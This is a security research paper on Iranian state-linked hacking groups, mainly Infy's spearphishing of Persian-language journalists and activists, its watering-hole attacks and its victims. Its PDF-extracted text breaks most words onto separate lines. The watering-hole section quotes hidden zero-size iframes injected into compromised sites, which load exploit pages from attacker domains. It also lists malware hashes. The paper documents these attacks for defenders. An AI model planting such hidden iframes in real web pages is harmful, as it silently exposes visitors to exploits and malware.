IranandtheSoftWar 
forInternetDominance 


Claudio 
Guarnieri 
& 
Collin 
Anderson1 
Black 
Hat 
USA, 
August 
2016 


Tableof 
Contents 


Introduction 


Campaigns 
and 
Actors 
Infy 
Cleaver 
(Ghambar) 
Rocket 
Kitten 
Sima 


EndNote 
Acknowledgements 
Appendix 


Summary 


Over 
the 
past 
decade, 
the 
Islamic 
Republic 
ofIran 
has 
been 
targeted 
by 
continual 
intrusioncampaigns 
from 
foreignactors 
that 
soughtaccess 
tothe 
country's 
nuclear 
facilities, 
economic 
infrastructure, 
military 
apparatus, 
and 
governmentalinstitutions 
for 
the 
purpose 
of 
espionageand 
coercive 
diplomacy. 
Concomitantly, 
sincethe 
propagandic 
defacementsof 
internationalcommunications 
platforms 
and 
political 
dissident 
sitesconducted 
by 
an 
organization 
describing 
itself 
as 
the 
"Iranian 
Cyber 
Army" 
beginning 
inlate 
2009, 
Iranian 
actorshave 
been 
attributed 
in 
campaigns 
of 
intrusions 
and 
disruptionsof 
private 
companies, 
foreign 
government 
entities, 
domestic 
opposition, 
regional 
adversaries 
and 
international 
critics. 
While 
Iran 
maintains 
strongtechnical 
universities2 
and 
an 
extraordinarily 
active 
defacement 
community,3 
the 
country 
has 
not 
invested 
in 
its 
capacity 
for 
Internetbased 
espionage 
tothe 
same 
degree 
as 
its 
traditional 
geopoliticalrivals, 
and 
is 
less 
able 
to 
seekcapabilities 
abroad 
from 


1 
Contact: 
Claudio(nex@nex.sx, 
PGP: 
7359 
D880) 
and 
Collin 
(cda@asc.upenn.edu, 
PGP:FAFB 
F2FA) 
2 
Sharif 
University 
of 
Technology 
for 
example 
is 
aninternationally 
recognized 
engineering 
school. 
https://www.timeshighereducation.com/worlduniversityrankings/
sharifuniversityoftechnology 
3 
Ashiyane 
DigitalSecurity 
Teamandotherdefacement 
groups 
have 
commonly 
held 
positions 
inthe 
leaderboard 
of 
ZoneH 
and 
areattributed 
withthousandsof 
defacements. 
http://www.zoneh.
org/stats/notifierspecial 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


companies 
suchas 
Hacking 
Team 
orFinfisher 
due 
toits 
pariah 
status. 
As 
aresult, 
thecomputer 
network 
operationsattributedto 
Iranian 
actorsprovide 
insightinto 
the 
behavior 
of 
a 
country 
under 
scrutiny 
due 
to 
itsconflictual 
relationships 
with 
regional 
adversaries, 
and 
may 
reflect 
the 
generaltrajectory 
ofother 
countries 
seekingto 
use 
the 
espionage 
on 
modern 
communications 
technologies 
to 
pursue 
their 
own 
geopolitical 
interests. 


Civil 
society 
and 
political 
opponents 
are 
aprimary 
target 
of 
Iranian 
intrusion 
campaigns, 
which 
gives 
rise 
to 
the 
motivation 
and 
basis 
for 
our 
research 
into 
the 
ecosystems 
and 
threats 
originating 
from 
the 
country. 
This 
document 
serves 
an 
initial 
technical 
overview 
in 
complement 
to 
aforthcoming 
publication 
from 
the 
Carnegie 
Endowment 
for 
International 
Peace 
on 
Iranbased 
computer 
network 
operations, 
and 
is 
intended 
to 
provide 
the 
following: 


● 
firstaccountingofanewthreatactortargetinginterestsalignedwiththeIranianstate; 
● 
additionalresearchontheactivitiesoftheInfygroup,whichsupportsandextendsaccountsofthe 
group's 
activities 
recently 
disclosed 
elsewhere; 
● 
documentationofnewdevelopmentsinthemalwareandactivitiesbelievedtobeconnectedto 
known 
threat 
actors 
Rocket 
Kitten 
and 
Operation 
Cleaver; 
and, 
● 
descriptionsoftacticsbyknownactorsinresponsetopoliticaleventsinsideofIranandchanges 
the 
use 
of 
personal 
communications 
tools 
by 
the 
public, 
namely 
the 
mass 
adoption 
of 
Telegram. 
Our 
research 
incurs 
classic 
issues 
applicable 
to 
all 
reports 
on 
intrusion 
campaigns, 
primarilyquestionsof 
attribution 
and 
intent. 
Theend 
objective 
ofparticular 
CNO 
activities 
is 
not 
always 
discernable 
based 
on 
the 
tactics 
usedor 
thedata 
accessed, 
as 
the 
end 
implications 
of 
the 
disclosureof 
particularinformation 
is 
often 
distant 
andconcealedfromeven 
the 
target. 
Where 
such 
intent 
is 
made 
evident, 
the 
reasons 
for 
Iranian 
intrusion 
campaigns 
range 
from 
retaliatory 
campaigns 
against 
adversaries, 
as 
a 
result 
of 
identifiable 
grievances,to 
surveillance 
of 
domestic 
opposition 
in 
supportof 
theIslamic 
Republic 
establishment. 
Iranian 
intrusionsets 
appear 
to 
be 
interested 
in 
a 
broad 
field 
of 
challenges 
to 
the 
political 
and 
religious 
hegemony 
of 
the 
Islamic 
Republic. 
Previous 
reports 
onIranian 
campaigns 
have 
referred 
to 
the 
targeting 
ofIranian 
dissidents, 
however, 
in 
practice 
those 
targeted 
rangefromreformists 
operating 
within 
the 
establishmentfrominside 
of 
Iran 
to 
violent 
extremist 
organizations 
outside. 
Therefore, 
Iranian 
CNO 
activities 
should 
beconsidered 
as 
a 
tool 
inthe 
context 
broader 
state 
activities 
and 
policies, 
including 
offline 
events. 


For 
the 
purpose 
of 
organization, 
this 
document 
is 
divided 
based 
on 
the 
actorgroup 
that 
we 
believeto 
be 
responsible 
for 
the 
tools, 
incidents, 
and 
activities 
under 
discussion. 
We 
also 
attempt 
to 
blendthe 
context 
and 
history 
of 
incidents 
with 
the 
technicalspecificities 
in 
each 
section, 
broken 
out 
intodifferent 
subsections. 
In 
order 
to 
avoid 
further 
expansion 
of 
this 
document, 
we 
momentarily 
defer 
to 
previous 
reports 
for 
contextabout 
groups, 
with 
the 
intention 
ofextendingthis 
background 
narrativelater. 
In 
practice, 
thedistinction 
relied 
upon 
is 
artificial, 
as 
the 
boundariesbetween 
groups 
at 
times 
appears 
less 
clear, 
and 
tactics 
have 
evolvedrapidly 
in 
responseto 
externalpressure. 
For 
example, 
in 
past 
reports 
that 
have 
identified 
Iranian 
malware 
such 
as 
Madi,Stealer, 
and 
Sayyad, 
these 
families 
ofagents 
appear 
tofall 
intodisuse 
within 
a 
short 
period 
of 
their 
discovery 
and 
public 
attributionto 
Iranian 
entities. 
Such 
discontinuity, 
and 
the 
opacity 
evenwithinactivities 
published 
on, 
has 
further 
reinforced 
the 
difficultyin 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


constructing 
a 
cogent 
narrative 
of 
specific 
threat 
groups. 
This 
aspect 
of 
the 
ecosystem 
is 
not 
in 
scope 
here, 
and 
we 
focus 
instead 
on 
technical 
documentation, 
and 
will 
revisit 
the 
contextin 
our 
forthcoming 
research. 


Finally, 
this 
document 
is 
intended 
to 
be 
the 
first 
release 
in 
a 
set 
of 
continuing 
disclosures, 
and 
shouldbe 
considered 
a 
living 
resource;subject 
to 
revision, 
reconsiderationand 
provided 
with 
the 
promise 
of 
expansion. 


Research: 
https://iranthreats.github.io 


Introduction 


Over 
the 
course 
of 
three 
years 
of 
observation 
of 
campaignstargeting 
civil 
society 
and 
human 
rights 
organizations, 
from 
records 
of 
well 
over 
twohundred 
spearphishing 
andother 
intrusion 
attemptsagainst 
individuals 
inside 
of 
Iran 
andin 
thediaspora, 
a 
narrativeof 
persistent 
intrusion 
efforts 
emerges. 
From 
Madi 
onward, 
Iranian 
threatactors 
maintaina 
consistent 
set 
of 
interests 
andactivities 
that 
blur 
the 
lines 
between 
domestic 
surveillance 
and 
foreign 
commercial 
espionage. 
This 
pattern 
continues 
across 
subsequent 
groups. 
Infy 
engaged 
in 
malware 
spearphishing 
against 
the 
same 
targets 
as 
Flying 
Kitten 
from 
the 
outset 
of 
its 
campaign; 
Operation 
Cleaverhasregistered 
several 
resources 
related 
to 
development 
agencies 
thathave 
been 
the 
subject 
ofintrusion 
attempts 
by 
others 
since 
February 
2014. 
This 
documentation 
provides 
new 
insightinto 
intrusioneffortsconducted 
by 
at 
least 
four 
discrete 
Iranian 
threat 
actors, 
Rocket 
Kitten, 
Infy, 
Sima, 
and 
OperationCleaver, 
including 
groups 
andtoolsthat 
have 
not 
been 
previously 
disclosed. 


Attribution 
of 
differentIranian 
intrusion 
efforts 
has 
been 
madepossible 
throughthe 
reuseof 
common 
templates 
and 
infrastructureover 
long 
periods 
of 
time, 
coupled 
with 
failures 
inoperationalsecurity 
that 
exposed 
informationon 
the 
actors 
behind 
thecampaigns. 
These 
approachesare 
imperfect, 
as 
the 
participants 
often 
attempt 
to 
breakpatterns 
after 
publicity 
has 
called 
attention 
to 
theiractivities 
and 
provided 
critical 
external 
feedback 
on 
their 
strategies. 
No 
collected 
documentation 
demonstrates 
the 
process 
of 
selecting 
targets 
or 
coordinatingcampaigns, 
however, 
many 
of 
those 
targeted 
would 
be 
later 
singled 
outby 
other 
actors, 
and 
their 
targeting 
aligns 
withIran’s 
political 
environment. 
The 
intrusion 
sets 
documented 
haveclear 
indications 
of 
being 
solelyIranians 
inside 
of 
Iran, 
with 
little 
indication 
of 
participation 
from 
Iranians 
in 
the 
diaspora 
or 
support 
from 
nonIranians. 
At 
the 
most 
basic 
level, 
the 
groups 
ofactors 
follow 
similarpatterns 
of 
lifeapproximating 
that 
of 
anIranian 
workday 
(Saturday 
through 
Wednesday) 
and 
arefully 
dormanton 
Iranian 
holidays,particularly 
thelong 
vacation 
period 
of 
Nowruz. 


Based 
on 
our 
longitudinal 
account 
of 
infrastructure 
employed 
in 
intrusion 
attempts 
against 
civil 
society, 
we 
find 
thatthe 
activities 
of 
Iranian 
actors 
dateback 
further 
than 
previously 
documented 
and 
cover 
a 
richerset 
of 
targets. 
Iranian 
threat 
actors 
haveresponded 
to 
improved 
information 
security 
practices 
amongst 
its 
target 
populations 
and 
increasedpressure 
resulting 
from 
publication 
of 
their 
activities. 
The 
Sima 
and 
Operation 
Cleaver 
groups 
represent 
the 
most 
sophisticated 
spearphishing 
campaignsobserved 
from 
Iran 
thus 
far,using 
open 
mailrelays 
to 
send 
professionallytailored 
messages 
based 
on 
monitoring 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


of 
target 
interests 
and 
emotional 
manipulation, 
such 
as 
stark 
threats 
of 
immigration 
issues 
as 
the 
Department 
ofHomeland 
Security. 
While 
such 
campaigns 
may 
not 
represent 
Iran’s 
graduationto 
a 
first 
or 
second 
tier 
power, 
these 
incidents 
impact 
livelihoods, 
and 
their 
documentation 
provides 
tactics 
of 
public 
accountability. 
The 
studyof 
these 
properties 
and 
the 
similarities 
between 
actors 
lends 
an 
insightinto 
the 
capabilities 
and 
interests 
of 
Iranian 
intrusionsets, 
and 
their 
foreshadowsfuture 
activities. 


Campaigns 
and 
Actors4 


Infy 


Introduction 


Sinceearly2013, 
we 
haveobserved 
activity 
from 
a 
uniquethreat 
actor 
group, 
which 
we 
began 
to 
investigate 
based 
on 
increasedactivities 
against 
human 
rightactivists 
in 
the 
beginning 
of 
2015.5 
Inline 
with 
other 
research 
on 
the 
campaign, 
released 
prior 
to 
publication 
of 
this 
document, 
we 
have 
adopted 
the 
name 
“Infy”, 
which 
is 
based 
on 
labels 
used 
in 
the 
infrastructure 
andits 
two 
families 
ofmalware 
agents. 


Thanks 
to 
information 
we 
have 
beenable 
to 
collect 
during 
the 
course 
of 
our 
research, 
such 
as 
characteristics 
of 
the 
group’s 
malware 
and 
development 
cycle, 
our 
research 
strongly 
supportsthe 
claim 
that 
the 
Infy 
group 
is 
ofIranian 
origin 
and 
potentially 
connectedto 
the 
Iranian 
state. 
Amongst 
a 
backdrop 
of 
other 
incidents, 
Infy 
became 
one 
of 
the 
most 
frequentlyobserved 
agents 
for 
attempted 
malware 
attacks 
against 
Iranian 
civil 
society 
beginning 
in 
late 
2014, 
growingin 
use 
up 
to 
the 
February 
2016 
parliamentary 
election 
in 
Iran. 
Afterthe 
conclusion 
of 
the 
parliamentary 
election, 
the 
rate 
ofattempted 
intrusions 
and 
new 
compromises 
through 
the 
Infy 
agent 
slowed, 
but 
did 
notend. 
The 
trends 
witnessed 
in 
reports 
from 
recipients 
are 
reinforced 
through 
telemetry 
provided 
by 
design 
failures 
in 
morerecent 
versions 
of 
the 
Infy 
malware. 


4 
NB: 
Historically, 
naming 
schemas 
on 
Iranian 
actorshavebeen 
challenging, 
even 
when 
researchers 
are 
acquainted 
with 
the 
cultural, 
linguisticand 
politicalcontextof 
the 
country. 
For 
example, 
while 
Madi 
was 
linked 
with 
the 
Shi’a 
beliefin 
the 
Twelfth 
Imam, 
Mahdiis 
also 
a 
common 
name, 
whicharises 
elsewhere 
inseveral 
samples 
alongside 
other 
Persian 
names 
or 
words 
(“Motahare.txt”). 
Similarly, 
while 
“Gholee” 
was 
linked 
to 
a 
minor 
musicianin 
one 
report, 
the 
reference 
could 
have 
as 
easily 
been 
a 
code 
comment 
inPersianrelevantto 
its 
functionalities 
(from 
transliterated 
Persian, 
“peak”). 
Where 
we 
find 
namesembedded 
in 
samplesfrom 
project 
resources,they 
are 
often 
less 
than 
inspiring, 
suchas 
“ExtremeDownloader” 
or 
“Stealer.” 
The 
approach 
of 
usingunique 
strings 
still 
seems 
more 
preferablethan 
generic 
references 
to 
Iran, 
so 
where 
possible, 
our 
namingconvention 
relies 
on 
unique 
identifiers 
that 
originate 
from 
malwareagents 
and 
infrastructure 
thatare 
sufficiently 
distinctive, 
while 
attempting 
to 
avoid 
sensationalism 
orstereotypes. 
5 
Afterthedraftingofthispaperwascompleted,CaliforniabasedsecurityvendorPaloAltoNetworkspublished 
two 
blog 
posts 
that 
includes 
information 
on 
thissamecampaign. 
Similarly, 
the 
HeliosTeam 
at 
360 
SkyEye 
Labs 
has 
documented 
some 
of 
theactivities 
of 
Infy 
under 
Operation 
Mermaid. 
Whilethesereports 
often 
have 
commonalities 
and 
overlaps, 
they 
all 
offer 
differing 
and 
complementary 
perspectives 
into 
the 
campaign. 


http://researchcenter.paloaltonetworks.com/2016/05/princeofpersiainfymalwareactiveindecadeoftargetedatta 
cks/ 
http://researchcenter.paloaltonetworks.com/2016/06/unit42princeofpersiagameover/ 
https://ti.360.com/upload/report/file/mryxdgkb20160707en.pdf 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


Palo 
Alto 
Networks 
has 
noted 
and 
described 
the 
differences 
of 
two 
malware 
agents 
developed 
in 
parallel, 
with 
commonalities 
in 
behaviorbutdiffering 
functionalities; 
families 
described 
as 
Infy 
and 
InfyM. 
Our 
primary 
observation 
wasof 
the 
Infy 
(nonM) 
malware,which 
primarily 
functions 
as 
a 
keylogger 
forthe 
collection 
of 
account 
credentials. 
Until 
the 
publication 
of 
the 
Palo 
Alto 
report, 
thedevelopers 
of 
the 
Infy 
appearedto 
be 
actively 
updating 
andmaintaining 
the 
codebase, 
and 
new 
releases 
weredistributed 
to 
existing, 
as 
well 
as 
new, 
targets 
quiteregularly. 
At 
the 
time 
of 
writing,the 
latestInfy 
keylogger 
was 
version 
00031, 
which 
appears 
to 
have 
been 
interrupted 
by 
public 
disclosure 
before 
it 
reached 
wide 
deployment, 
with 
our 
firstcollected 
samples 
appearing 
in 
May 
2013. 
Othersampleswere 
found 
bearinga 
compilationtime 
as 
early 
as 
June2012and 
version 
00002. 
Similar 
to 
the 
increasepriorparliamentary 
election, 
these 
first 
samples 
appeared 
coinciding 
with 
Iran’s 
Presidential 
election 
–then 
a 
critical 
moment 
due 
to 
being 
the 
first 
Presidential 
election 
since 
the 
highlycontested 
Green 
Movement. 


Our 
analysis 
indicates 
that 
the 
Infymalware 
agents 
havebeen 
employed 
for 
compromising 
targets 
pertinentto 
theinternal 
security 
interests 
of 
the 
Iraniangovernment 
since 
at 
least 
July 
2010. 
Infy 
is 
evidently 
an 
intrusion 
operation 
that 
has 
been 
runningfor 
severalyears, 
even 
continuing 
on 
in 
some 
form 
since 
the 
publication 
of 
the 
activities,with 
new 
agents 
found 
from 
late 
June 
2016. 


HistoryandTactics 


Prior 
to 
the 
June 
2013 
Presidential 
election, 
staff 
membersof 
BBC 
Persian 
and 
other 
Persianlanguage 
satellite 
television 
networks 
received 
a 
series 
of 
filespurporting 
to 
be 
statements 
from 
political 
opposition 
groups 
inside 
of 
the 
country. 
One 
message6 
claimedto 
be 
from 
MohammadTaghi 
Karroubi,the 
sonof 
reformist 
politician 
Mehdi 
Karroubi 
who 
ran 
forpresidency 
in 
the 
2009 
elections 
and 
has 
been 
under 
house 
arrest 
since 
February 
2011 
(25 
Bahman). 
The 
document 
discusses 
thedisqualification 
of 
former 
President 
Hashemi 
Rafsanjani 
from 
the 
elections, 
the 
role 
ofthe 
Guardian 
Council 
in 
the 
vetting 
of 
candidates, 
and 
whetherreformists 
should 
vote. 
The 
original 
source 
of 
this 
document 
is 
unclear. 
The 
text 
alsodoes 
not 
appear 
to 
have 
been 
publiclyavailable, 
and 
may 
have 
beenfalsely 
attributedto 
Mohammad 
Taghi. 


As 
the 
election 
neared, 
successive 
documentswith 
the 
filenames 
of 
“Statement”7 
and 
“Alliance”8 
in 
Persian 
weresent 
from 
the 
same 
Gmail 
address 
toa 
widening 
setof 
media 
figures 
outside 
of 
Iran,9 
such 


10 
11 
12 


asNimaAkbarpour 
andNikahangKowsar 
,andsocialnetworkuserssupportingreformistfigures. 


6 
entekhabat.rar 
fe57d408252af3c0fe776b34e838ac98 
7 
bayaniehcod.rar 
dd0332049dc3fad6b81b3b2e036af718 
8 
etelaf.rar 
55cb9a6e01e8b5e28633020e95a0a8e4 
9 
https://www.facebook.com/Admin.ComNews/posts/10151468451866274?fref=nf 
10 
https://plus.google.com/%2BNimaAkbarpour/posts/SMP1VYTaA1M 
11 
https://www.facebook.com/nikowsar/posts/261690493970257 
12 
https://plus.google.com/+HamedMousavi/posts/Xe37MyYBePm 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 



While 
the 
defacements 
and 
massphishing 
events, 
conducted 
by 
other 
groups 
in 
parallel 
to 
the 
malware 
emails, 
waned 
after 
theelections, 
the 
intrusion 
attemptsfromthe 
Infy 
malware 
group 
didnot. 
The 
culprits 
behind 
the 
campaign 
expanded 
tactics, 
sendingmalware 
embedded 
in 
PowerPoint 
presentations 
topical 
to 
events 
in 
Iran, 
such 
as 
“Iran’s 
Nuclear 
Power!”13, 
and 
impersonating 
othersto 
leverage 
social 
trust. 
Over 
the 
monthsfollowing 
theelections, 
the 
accounts 
of 
Iranians 
that 
hadbeen 
compromised 
by 
the 
actors 
were 
thenused 
for 
spreading 
the 
malware. 
The 
personalemail 
of 
anemployeeof 
VOA’s 
Persian 
News 
Networkwas 
used 
to 
send 
the 
Infy 
malware 
to 
other 
journalists, 
attached 
as 
files 
named 
“Visual” 
(didani.pps) 
and 
“Invitation 
Card.”14 
Shortly 
after, 
in 
August 
2013, 
a 
typographic 
email 
address 
claiming 
to 
be 
a 
reformist 
activist 
and 
journalist 
was 
usedto 
approach 
a 
Persianlanguagebroadcasterand 
a 
Green 
Movement 
supporter, 
with 
malware 
samples 
embedded 
in 
content 
related 
to 
poverty. 
Similarly, 
a 
imposture 
account 
posing 
asan 
Iranian 
professor 
of 
political 
scienceand 
mediacommentator 
was 
used 
to 
approach 
a 
BBC 
Persian 
presenterand 
others 
in 
the 
followingyear. 


Our 
observation 
of 
Infy’scampaigns, 
primarily 
through 
thelens 
of 
spearphishing 
attacks 
againstIranian 
civil 
society 
and 
media 
organizations, 
indicates 
a 
wandering 
focus 
on 
particulardemographics 
on 
a 
strategic 
basis 
over 
time. 
When 
activities 
targeting 
ofcivil 
societysubsided, 
the 
actors 
instead 
appeared 
to 
have 
focused 
on 
external 
targets, 
such 
a 
series 
of 
attempts 
tospearphish 
the 
Danish 
Ministry 
of 
Foreign 
Affairs.15 
The 
Infy 
malware 
was 
seen 
targeting 
Iranians 
again 
in 
June 
2015, 
whenit 
was 
shared 
with 
researchers 
afterbeing 
sent 
toa 
broadcast 
journalist 
at 
BBC 
Persian 
with 
a 
generic 
introduction 
and 
a 
PowerPointpresentation 
attached 
titled 
“Nostalogy”16 
(sic). 


Based 
on 
samples 
andobservations 
of 
spearphishing 
attempts,it 
appears 
that 
during 
thistime 
there 
was 
an 
evolution 
inInfy’s 
infrastructureand 
tactics, 
connectedwith 
renewed 
attempts 
at 
surveillance 
of 
diaspora 
organizations. 
Based 
on 
information 
collected 
in 
the 
course 
of 
this 
research, 
the 
targets 
and 
victims 
of 
Infy’scampaigns 
have 
continued 
to 
be 
strongly 
aligned 
with 
Iran’s 
“softwar” 
agenda,internal 
security 
policies, 
and 
regional 
adversaries 
of 
the 
hardline 
establishment 
of 
the 
Islamic 
Republicof 
Iran. 
The 
trends 
align 
with 
campaigns 
concurrently 
conducted 
by 
other 
knownIranian 
intrusion 
sets, 
evento 
the 
extent 
of 
overlapping 
intrusion 
attempts 
and 
shared 
successful 
compromises 
of 
targets. 


13 
nuclear_power.pps 
463205b5ddd3437f1af559ead6a750e3 


f2eb7c2d886ae970e477307f1433f33c 
کار ﺕ 
.pps دعو 
ﺕ 
14 


15 
Rapport 
omAPTangreb 
mod 
Udenrigsministeriet, 
Center 
for 
Cybersikkerhed. 


https://feddis.
dk/cfcs/CFCSDocuments/Phishing%20uden%20fangst.pdf 


16 
nostalogy.pps 
501e2bdc7d77da15ae2b48eb5c49bc1d 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


Until 
late 
December 
2015, 
in 
nearlyevery 
Infy 
message 
documented 
since 
our 
tracking 
began 
in 
May 
2013, 
no 
attempt 
includedstrong 
tailoring 
of 
the 
approach, 
often 
not 
even 
including 
an 
email 
body, 
instead 
relying 
on 
crypticfilenamesand 
email 
subjects 
to 
attract 
interest. 
That 
December 
marked 
a 
meaningful 
departure 
from 
this 
pattern, 
as 
the 
culprits 
beganto 
add 
more 
descriptive 
information 
to 
their 
attempts, 
addressing 
topical 
issues 
and 
catering 
to 
the 
interests 
of 
the 
target. 
As 
in 
the 
past, 
these 
messages 
have 
beensent 
accounts 
believedto 
be 
fake 
and 
accounts 
compromised 
by 
Infy,including 
Kurdish 
activists 
thathad 
previously 
been 
compromised 
by 
the 
Flying 
Kitten 
actor 
group.17 


The 
targets 
and 
timing 
of 
this 
shift 
aligns 
with 
increased 
attentionto 
thepoliticalenvironment 
inthe 
lead 
up 
to 
theFebruary 
2016 
Parliamentary 
Election. 
One 
narrowlytargetedspearphishing 
from 
Infy 
was 
sent 
from 
the 
compromised 
account 
of 
a 
political 
activist 
promoting 
participation 
insideof 
Iran, 
claiming 
tobe 
a 
set 
ofimages 
of 
a 
BritishIranian 
dual 
national 
that 
has 
beenheld 
in 
Evin 
Prison 
for 
five 
years 
on 
espionage 
charges.18 
These 
message 
have 
also 
encouraged 
their 
targets 
to 
share 
the 
documents 
to 
other 
human 
rights 
organizations 
and 
media 
outlets, 
in 
the 
hopes 
of 
further 
increasing 
their 
potentialreach. 
These 
improved 
pretexting 
tactics 
arewell 
connected 
tothe 
press 
cycle. 
Within 
daysof 
themass 
disqualification 
of 
reformist 
parliamentary 
candidates 
by 
the 
Guardian 
Council, 
one 
message 
claimed 
to 
cover 
opposition 
protests; 
another, 
purported 
to 
containHassan 
Khomeini’s 
reaction 
tothe 
rejection 
of 
his 
religiouscredentials 
in 
his 
attempted 
candidacy 
for 
the 
Assembly 
of 
Experts. 


Re: 
FREE 
KAMAL 
FOROUGHI 
Re: 
FREE 
KAMAL 
FOROUGHI 
Hello, 
سلا ﻡ 
Here's 
the 
campaign 
of 
Free 
Kamal 
Foroughi. 
کمپي ﻦ 
کما ﻝ 
فروغ ﯽ 
ر ﺍ 
آزا ﺩ 
کني ﺪ 
Images 
of 
political 
prisoner 
Kamal 
Foroughi 
at 
تصاوي ﺮ 
زندان ﯽ 
سياس ﯽ 
کما ﻝ 
فروغ ﯽ 
د ﺭ 
بن ﺪ 
209 
زندا ﻥ 
اوي ﻦ 
Ward 
209 
of 
Evin 
Prison. 
جه ﺖ 
انتشا ﺭ 
For 
publication. 


WateringHole 


Contact 
information 
and 
infrastructure 
usedin 
theoperations 
of 
the 
Infygroup 
implicate 
a 
broader 
set 
of 
domains 
than 
those 
directly 
used 
in 
command 
and 
controloperations 
with 
theagent. 
These 
domains 
commonly 
reflecta 
naming 
schema 
related 
to 
blogging 
and 
visitor 
analytics 
(e.g. 
“bestwebstat.com”). 
Based 
on 
live 
and 
archived 
examples 
of 
such 
tactics, 
a 
subset 
of 
the 
Infygroup’s 
domains 
appear 
to 
have 
been 
used 
in 
order 
to 
stage 
watering 
hole 
attacksagainst 
ethnicminority 
populations 
andmilitant 
organizations 
over 
the 
course 
of 
at 
least 
five 
years. 


Our 
earliest 
observed 
watering 
hole 
incident, 
occurring 
in 
July 
2010, 
involved 
intrusionsinto 
the 
“Taftaan 
News 
Agency” 
and 
“Jonbeshe 
Moqavemate 
Mardomie 
Iran” 
blogs, 
sites 
associated 
with 
the 
BalochistanbasedJundallah 
– 
a 
militant 
movement 
internationally 
recognized 
as 
a 
terroristorganization. 
19 
Shortly 
afterthe 
suspected 
time 
of 
intrusion, 
at 
leastone 
target 
had 
warned 
its 
visitors 
that 
anold 
email 


17 
https://www.fireeye.com/content/dam/fireeyewww/
global/en/currentthreats/
pdfs/rptoperationsaffronrose.
pdf 
18 
http://freekamalforoughi.com 
19 
https://web.archive.org/web/20110830125243/http://taptan313.blogspot.com/ 
https://web.archive.org/web/20100819184243/http://www.junbish.blogspot.com/ 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


address 
connected 
to 
the 
site 
had 
been 
compromised 
by 
actorsit 
claimed 
wasassociated 
with 
Iranian 
intelligence 
agenciesand 
then 
used 
to 
target 
others 
inthe 
community. 
The 
following 
day, 
the 
administrators 
notedtechnical 
issues 
as 
aresult 
of 
these 
attacks 
ina 
post 
announcing 
the 
closure 
of 
the 
site.20 
The 
actors 
behindthe 
incidents 
gained 
access 
to 
pertinent 
sites, 
and 
embeddeda 
hidden 
iframe 
in 
the 
target 
page 
claimingto 
be 
a 
“Stat 
Counter” 
inorder 
to 
disguise 
the 
intention 
ofthe 
malicious 
code. 
The 
malicious 
iframe 
appears 
to 
have 
used 
wellknown 
ActiveXvulnerabilities 
for 
IE6 
and 
IE7(which 
would 
have 
still 
been 
used 
in 
2010)in 
order 
to 
push 
an 
early 
version 
of 
one 
of 
the 
Infy 
agents 
to 
visitors. 
In 
addition 
tocommon 
infrastructure 
andrecognizable 
binary 
names 
related 
to 
other 
Infy 
attacks, 
the 
delivering 
mechanismincluded 
Persianlanguage 
comments 
on 
the 
functioning 
ofthe 
code 
within 
its 
otherwise 
packed 
Javascript.21 


The 
use 
of 
watering 
hole 
tactics 
continueduntil 
at 
least 
the 
middle 
ofMay 
2015,22 
when 
aKurdishnews 
site 
(Kurdistannet) 
was 
similarly 
compromised 
for 
the 
purpose 
of 
delivering 
the 
Infy 
M 
agent. 
The 
intrusion 
into 
the 
Kurdish 
site 
aligns 
withthe 
organization’s 
documented 
history 
of 
targeting 
Kurdish 
activists, 
particularly 
those 
based 
in 
Iran 
or 
of 
Iranian 
nationality. 


Kurdish 
Site 
(2015) 
Jondallah 
Militant 
Organizations 
(2010) 
<div 
style="display:none" 
name="Stat 
Counter"> 
<iframe 
name="statModules" 
width="0" 
height="0" 
marginwidth="0" 
marginheight="0" 
scrolling="no" 
border="0" 
frameborder="0" 
src="http://wpstat.mine.bz/e1/stat1.php"></iframe 
> 
</div> 
<iframe 
frameborder='0' 
height='0' 
id='IF198' 
marginheight='0' 
marginwidth='1' 
name='IF198' 
scrolling='no' 
src='http://www.bestwebstat.com/e/nt/ifr2.php' 
width='0'></iframe> 


Victimology 


While 
not 
indicative 
of 
the 
full 
extent 
of 
other 
intrusionoperations 
the 
Infy 
group 
might 
be 
running, 
as 
of 
March 
31, 
2016, 
we 
observed 
a 
total 
of 
236uniquevictims 
distributed 
across 
27countries 
from 
solely 
versions 
25 
through 
30 
of 
the 
Infy 
(nonM) 
agent. 
For 
how 
this 
telemetry 
was 
collected, 
see 
A 
Not 
So 
Clever 
Failover 
Strategy.Interestingly, 
the 
number 
and 
the 
natureof 
victims 
have 
reflected 
political 
events 
and 
the 
evolving 
geopolitical 
interests 
of 
Iran. 
Forexample, 
we 
observed 
new 
compromises 
locatedin 
Saudi 
Arabia 
in 
the 
fallout 
between 
the 
countries 
afterthe 
execution 
of 
a 
Shiite 
cleric 
and 
the 
Mina 
Hajj 
stampede.23 


20 
http://taptan313.blogspot.com/2010/07/blogpost_
9301.html 
http://taptan313.blogspot.com/2010/07/blogpost_
27.html 


21 
In 
translated 
Persian 
“jelogiri 
az 
ejraie 
dobare 
dar 
sorate 
moshahede 
mojadad” 
22https://web.archive.org/web/20150522072531/http://www.kurdistannet.org/2015/index.php 
–Also 
notedby 
the 
Helios 
team. 
23 
http://www.nytimes.com/2016/01/04/world/middleeast/iransaudiarabiaexecutionsheikhnimr.
html 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


Infy 
(v. 
25 
31) 
Infections, 
December 
2015 
May 
2016 


The 
primary 
targets 
ofthese 
campaigns 
have 
consistently 
been 
Iranians 
inside 
of 
Iran,with 
48% 
of 
identified 
intrusions 
connected 
with 
IPaddresses 
located 
in 
Iran, 
in 
additionto 
a 
strong 
interest 
in 
Iranians 
in 
the 
diaspora, 
as 
indicated 
bythe 
messages 
in 
baitfiles 
and 
hostnames 
we 
wereable 
to 
observe. 
The 
attackers 
maintained 
a 
secondary 
interest 
in 
espionage 
against 
regional 
adversaries 
and 
neighboring 
states. 
This 
characteristic 
matches 
previouslydocumented 
CNO 
campaigns. 
As 
with 
FlyingKitten 
andRocket 
Kitten, 
the 
resources 
and 
personnel 
leveragedin 
Infy 
campaigns 
against 
domestic 
opponents 
